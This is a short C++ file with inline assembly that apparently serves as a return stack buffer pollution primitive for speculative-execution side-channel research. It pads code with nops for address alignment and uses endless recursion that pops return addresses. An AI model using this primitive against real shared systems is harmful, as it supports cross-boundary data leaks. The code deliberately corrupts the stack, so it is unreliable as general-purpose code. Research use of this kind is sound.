#include "util.hpp"

using namespace std;

void AddressAlignment(){
	__asm__(
		".rep 1578;"
		"nop;"
		".endr;"
	);
}

void pollute(){
	__asm__(
		"pop %rdi;"
		"pop %rdi;"
	);
	pollute();
}

int polluteWrapper(){
	cout<<"Start polluting RSB..."<<endl;
	pollute();
	return 0; 
}

int main(){
	polluteWrapper();
	return 0;
}